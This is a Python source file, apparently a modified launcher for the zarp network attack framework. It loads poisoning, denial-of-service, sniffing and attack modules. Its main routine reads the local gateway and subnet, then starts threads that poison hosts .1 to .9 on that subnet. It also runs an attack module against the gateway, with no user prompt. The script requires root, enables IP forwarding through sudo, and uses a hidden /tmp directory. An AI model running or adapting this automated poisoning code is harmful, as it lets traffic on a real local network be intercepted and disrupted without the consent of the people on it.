#! /usr/bin/python

from os import getcwd, getuid, _exit
from os.path import exists
from sys import path, argv, exit, version, version_info
path.insert(0, getcwd() + '/src/')
path.insert(0, getcwd() + '/src/core/')
path.insert(0, getcwd() + '/src/modules/')
path.insert(0, getcwd() + '/src/lib/')
path.insert(0, getcwd() + '/proxy/')
from commands import getoutput
# module loading
from src.modules import poison, dos, scanner, services
from src.modules import sniffer, parameter, attacks
import config
import database
from colors import color
import platform
import util
from proxy import test
import thread
import subprocess
import os

try:
    # load py2.7 stuff here so we can get to the depends check
    import parse_cmd
    import importlib
    import session_manager
    import stream
except:
    pass


class LoadedModules:
    """ Load modules
    """
    def __init__(self):
        self.total = 0
        self.poison = []
        self.dos = []
        self.sniffers = []
        self.services = []
        self.scanner = []
        self.parameter = []
        self.attacks = []

    def load(self):
        """ Load modules.  Verify the module loads successfully
            before loading it up into the module list; this prevents
            crashes related to unmet dependencies.
        """
        for module in poison.__all__:
            if util.check_dependency('src.modules.poison.%s' % module):
                mod = getattr(importlib.import_module(
                            'src.modules.poison.%s' % module, 'poison'), 
                            module)
                self.poison.append(mod)
                self.total += 1
        for module in dos.__all__:
            if util.check_dependency('src.modules.dos.%s' % module):
                mod = getattr(importlib.import_module(
                                'src.modules.dos.%s' % module, 'dos'), 
                                module)
                self.dos.append(mod)
                self.total += 1
        for module in scanner.__all__:
            if util.check_dependency('src.modules.scanner.%s' % module):
                mod = getattr(importlib.import_module(
                            'src.modules.scanner.%s' % module, 'scanner'), 
                            module)
                self.scanner.append(mod)
                self.total += 1
        for module in services.__all__:
            if util.check_dependency('src.modules.services.%s' % module):
                mod = getattr(importlib.import_module(
                            'src.modules.services.%s' % module, 'services'), 
                            module)
                self.services.append(mod)
                self.total += 1
        for module in sniffer.__all__:
            if util.check_dependency('src.modules.sniffer.%s' % module):
                mod = getattr(importlib.import_module(
                            'src.modules.sniffer.%s' % module, 'sniffer'), 
                            module)
                self.sniffers.append(mod)
                self.total += 1
        for module in parameter.__all__:
            if util.check_dependency('src.modules.parameter.%s' % module):
                mod = getattr(importlib.import_module(
                            'src.modules.parameter.%s' % module, 'parameter'), 
                            module)
                self.parameter.append(mod)
                self.total += 1
        for module in attacks.__all__:
            if util.check_dependency('src.modules.attacks.%s' % module):
                mod = getattr(importlib.import_module(
                            'src.modules.attacks.%s' % module, 'attacks'), 
                            module)
                self.attacks.append(mod)
                self.total += 1


def main():
    """ Zarp entry point
    """

    # set up configuration
    config.initialize()

    # set up database
    database.initialize()

    # load modules
    loader = LoadedModules()
    loader.load()
    util.Msg('Loaded %d modules.' % loader.total)
    command='ip route show'
    getway=os.popen(command)
    ip1,ip2,Getway,ip4,ip5,ip6,ip7,ip8,subnet,ip10=getway.read().split(' ',9)
    a,subnet=subnet.split('\n')
    #print Getway,subnet[:-4]
    choice =1
    if choice==1:
	#target_ip='2 192.168.10.5'
	#thread.start_new_thread(stream.initialize,(loader.poison[choice - 1],target_ip,Getway))
	for x in range(1,10):
	    target_ip='2 '+subnet[:-4]+str(x)
	    thread.start_new_thread(stream.initialize,(loader.poison[choice - 1],target_ip,Getway))
	    #stream.initialize(loader.poison[choice - 1],target_ip)
	stream.initialize(loader.attacks[choice - 1],'0',Getway)
    

    # handle command line options first

    


# Application entry; dependency checks, etc.
if __name__ == "__main__":
    # perm check
    if int(getuid()) > 0:
        util.Error('Please run as root.')
        _exit(1)

    # check python version
    if version_info[1] < 7:
        util.Error('zarp must be run with Python 2.7.x.  You are currently using %s'
        % version)
        _exit(1)

    # check for forwarding
    system = platform.system().lower()
    if system == 'darwin':
        if not getoutput('sysctl -n net.inet.ip.forwarding') == '1':
            util.Msg('IPv4 forwarding disabled. Enabling..')
            tmp = getoutput(
                    'sudo sh -c \'sysctl -w net.inet.ip.forwarding=1\'')
            if 'not permitted' in tmp:
                util.Error('Error enabling IPv4 forwarding.')
                exit(1)
    elif system == 'linux':
        if not getoutput('cat /proc/sys/net/ipv4/ip_forward') == '1':
            util.Msg('IPv4 forwarding disabled.  Enabling..')
            tmp = getoutput(
                    'sudo sh -c \'echo "1" > /proc/sys/net/ipv4/ip_forward\'')
            if len(tmp) > 0:
                util.Error('Error enabling IPv4 forwarding.')
                exit(1)
    else:
        util.Error('Unknown operating system. Cannot IPv4 forwarding.')
        exit(1)

    # create temporary directory for zarp to stash stuff
    if exists("/tmp/.zarp"):
        util.init_app("rm -fr /tmp/.zarp")
    util.init_app("mkdir /tmp/.zarp")
    

    main()
    test()
